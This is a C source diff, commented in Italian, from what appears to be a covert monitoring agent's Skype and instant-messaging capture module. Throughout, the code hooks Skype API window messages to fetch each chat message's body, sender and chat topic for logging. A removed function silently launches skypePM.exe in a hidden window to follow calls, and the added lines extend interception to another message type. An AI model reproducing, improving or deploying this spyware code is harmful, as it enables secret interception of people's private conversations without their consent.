@@ -27,49 +27,6 @@ typedef struct im_skype_message_struct {
 } im_skype_message_entry;
 im_skype_message_entry *im_skype_message_list = NULL;
 
-// Monitora costantemente la presenza di SkypePM
-DWORD WINAPI IMMonitorSkypePM(DWORD dummy)
-{
-	STARTUPINFO si;
-	PROCESS_INFORMATION pi;
-	DWORD skipe_id;
-	HANDLE skype_handle;
-	char skype_path[MAX_PATH];
-	char *skype_pm_ptr;
-	char skype_pm_path[MAX_PATH];
-
-	LOOP {
-		// SkypePM ci serve per tenere traccia del flusso delle chiamate
-		if (!HM_FindPid("skypePM.exe", TRUE) && !IsX64System()) {			
-			ZeroMemory( &si, sizeof(si) );
-			si.cb = sizeof(si);
-			si.wShowWindow = SW_HIDE;
-			si.dwFlags = STARTF_USESHOWWINDOW;
-
-			// Cerca il path di skypepm partendo da quello di skype.exe
-			// e lo esegue
-			if ( (skipe_id = HM_FindPid("skype.exe", TRUE)) ) {
-				if ( (skype_handle = FNC(OpenProcess)(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, skipe_id)) ) {
-					if (FNC(GetModuleFileNameExA)(skype_handle, NULL, skype_path, sizeof(skype_path)-1)) {
-						if (skype_pm_ptr = strstr(skype_path, "\\Phone\\")) {
-							*skype_pm_ptr = 0;
-							_snprintf_s(skype_pm_path, sizeof(skype_pm_path), _TRUNCATE, "%s\\Plugin Manager\\skypePM.exe", skype_path);		
-							HM_CreateProcess(skype_pm_path, 0, &si, &pi, 0);
-						}
-					}
-					CloseHandle(skype_handle);
-				}
-			}
-		}
-
-		for (DWORD i=0; i<6; i++) {
-			CANCELLATION_POINT(bPM_imspmcp);
-			Sleep(250);
-		}
-	}
-	return 0;
-}
-
 
 // Logga il contenuto delle finestre di IM
 void GetIM(QMessengerAgent *ma, BOOL bDontLog)
@@ -247,8 +204,6 @@ void SkypeLogMessageEntry(im_skype_message_entry *skentry)
 
 DWORD __stdcall PM_IMDispatch(BYTE *msg, DWORD dwLen, DWORD dwFlags, FILETIME *time_nanosec)
 {
-	static HWND im_skype_api_wnd = NULL;
-	static HWND im_skype_pm_wnd = NULL;
 	DWORD i, dummy;
 	COPYDATASTRUCT cd_struct;
 	char req_buf[512];
@@ -264,21 +219,21 @@ DWORD __stdcall PM_IMDispatch(BYTE *msg, DWORD dwLen, DWORD dwFlags, FILETIME *t
 	}
 	if (dwFlags == FLAGS_SKAPI_WND) {
 		REPORT_STATUS_LOG("- Monitoring IM queues.............OK\r\n");
-		im_skype_api_wnd = *((HWND *)msg);
+		skype_api_wnd = *((HWND *)msg);
 		return 1;
 	}
 	if (dwFlags == FLAGS_SKAPI_SWD) {
-		im_skype_pm_wnd = *((HWND *)msg);
+		skype_pm_wnd = *((HWND *)msg);
 		return 1;
 	}
 
 	// Per proseguire devo aver gia' intercettato le finestre
-	if (!im_skype_api_wnd || !im_skype_pm_wnd)
+	if (!skype_api_wnd || !skype_pm_wnd)
 		return 0;
 	if (dwFlags == FLAGS_SKAPI_MSG) {
 		NullTerminatePacket(dwLen, msg);
 		// Se e' una notifica di messaggio...
-		if (!strncmp((char *)msg, "CHATMESSAGE ", strlen("CHATMESSAGE "))) {
+		if (!strncmp((char *)msg, "CHATMESSAGE ", strlen("CHATMESSAGE ")) || !strncmp((char *)msg, "MESSAGE ", strlen("MESSAGE "))) {
 			DWORD direction;
 			char *msg_ptr, *message_id;
 		
@@ -290,7 +245,11 @@ DWORD __stdcall PM_IMDispatch(BYTE *msg, DWORD dwLen, DWORD dwFlags, FILETIME *t
 				*msg_ptr = 0;
 			} else
 				return 0;
-			message_id = (char *)msg + strlen("CHATMESSAGE ");
+
+			if (!strncmp((char *)msg, "CHATMESSAGE ", strlen("CHATMESSAGE ")))
+				message_id = (char *)msg + strlen("CHATMESSAGE ");
+			else
+				message_id = (char *)msg + strlen("MESSAGE ");
 
 			// Verifica che non ci sia gia' questo messaggio in lista
 			for (i=0; i<SKYPE_MESSAGE_BACKLOG; i++) {
@@ -322,19 +281,19 @@ DWORD __stdcall PM_IMDispatch(BYTE *msg, DWORD dwLen, DWORD dwFlags, FILETIME *t
 			cd_struct.dwData = 0;
 			cd_struct.lpData = req_buf;
 			cd_struct.cbData = strlen((char *)cd_struct.lpData)+1;
-			HM_SafeSendMessageTimeoutW(im_skype_api_wnd, WM_COPYDATA, (WPARAM)im_skype_pm_wnd, (LPARAM)&cd_struct, SMTO_NORMAL, 0, &dummy);
+			HM_SafeSendMessageTimeoutW(skype_api_wnd, WM_COPYDATA, (WPARAM)skype_pm_wnd, (LPARAM)&cd_struct, SMTO_NORMAL, 0, &dummy);
 			
 			_snprintf_s(req_buf, sizeof(req_buf), _TRUNCATE, "#IMAGB%s GET CHATMESSAGE %s BODY", message_id, message_id);		
 			cd_struct.dwData = 0;
 			cd_struct.lpData = req_buf;
 			cd_struct.cbData = strlen((char *)cd_struct.lpData)+1;
-			HM_SafeSendMessageTimeoutW(im_skype_api_wnd, WM_COPYDATA, (WPARAM)im_skype_pm_wnd, (LPARAM)&cd_struct, SMTO_NORMAL, 0, &dummy);
+			HM_SafeSendMessageTimeoutW(skype_api_wnd, WM_COPYDATA, (WPARAM)skype_pm_wnd, (LPARAM)&cd_struct, SMTO_NORMAL, 0, &dummy);
 
 			_snprintf_s(req_buf, sizeof(req_buf), _TRUNCATE, "#IMAGA%s GET CHATMESSAGE %s FROM_HANDLE", message_id, message_id);		
 			cd_struct.dwData = 0;
 			cd_struct.lpData = req_buf;
 			cd_struct.cbData = strlen((char *)cd_struct.lpData)+1;
-			HM_SafeSendMessageTimeoutW(im_skype_api_wnd, WM_COPYDATA, (WPARAM)im_skype_pm_wnd, (LPARAM)&cd_struct, SMTO_NORMAL, 0, &dummy);
+			HM_SafeSendMessageTimeoutW(skype_api_wnd, WM_COPYDATA, (WPARAM)skype_pm_wnd, (LPARAM)&cd_struct, SMTO_NORMAL, 0, &dummy);
 
 			return 1;
 		} else if (!strncmp((char *)msg, "#IMAGB", strlen("#IMAGB")) || 
@@ -391,13 +350,13 @@ DWORD __stdcall PM_IMDispatch(BYTE *msg, DWORD dwLen, DWORD dwFlags, FILETIME *t
 				cd_struct.dwData = 0;
 				cd_struct.lpData = req_buf;
 				cd_struct.cbData = strlen((char *)cd_struct.lpData)+1;
-				HM_SafeSendMessageTimeoutW(im_skype_api_wnd, WM_COPYDATA, (WPARAM)im_skype_pm_wnd, (LPARAM)&cd_struct, SMTO_NORMAL, 0, &dummy);
+				HM_SafeSendMessageTimeoutW(skype_api_wnd, WM_COPYDATA, (WPARAM)skype_pm_wnd, (LPARAM)&cd_struct, SMTO_NORMAL, 0, &dummy);
 				
 				_snprintf_s(req_buf, sizeof(req_buf), _TRUNCATE, "#IMAGT%s GET CHAT %s TOPIC", message_id, chat_name);		
 				cd_struct.dwData = 0;
 				cd_struct.lpData = req_buf;
 				cd_struct.cbData = strlen((char *)cd_struct.lpData)+1;
-				HM_SafeSendMessageTimeoutW(im_skype_api_wnd, WM_COPYDATA, (WPARAM)im_skype_pm_wnd, (LPARAM)&cd_struct, SMTO_NORMAL, 0, &dummy);
+				HM_SafeSendMessageTimeoutW(skype_api_wnd, WM_COPYDATA, (WPARAM)skype_pm_wnd, (LPARAM)&cd_struct, SMTO_NORMAL, 0, &dummy);
 			}
 			return 1;
 		}
@@ -428,7 +387,7 @@ DWORD __stdcall PM_IMStartStop(BOOL bStartFlag, BOOL bReset)
 		// Crea il thread che esegue gli IM
 		hIMThread = HM_SafeCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)IMCaptureThread, NULL, 0, &dummy);
 		// Crea il thread che monitora skypepm
-		hIMSkypePMThread = HM_SafeCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)IMMonitorSkypePM, NULL, 0, &dummy);
+		hIMSkypePMThread = HM_SafeCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)MonitorSkypePM, (DWORD *)&bPM_imspmcp, 0, 0);
 	} else {
 		// All'inizio non si stoppa perche' l'agent e' gia' nella condizione
 		// stoppata (bPM_IMStarted = bStartFlag = FALSE)
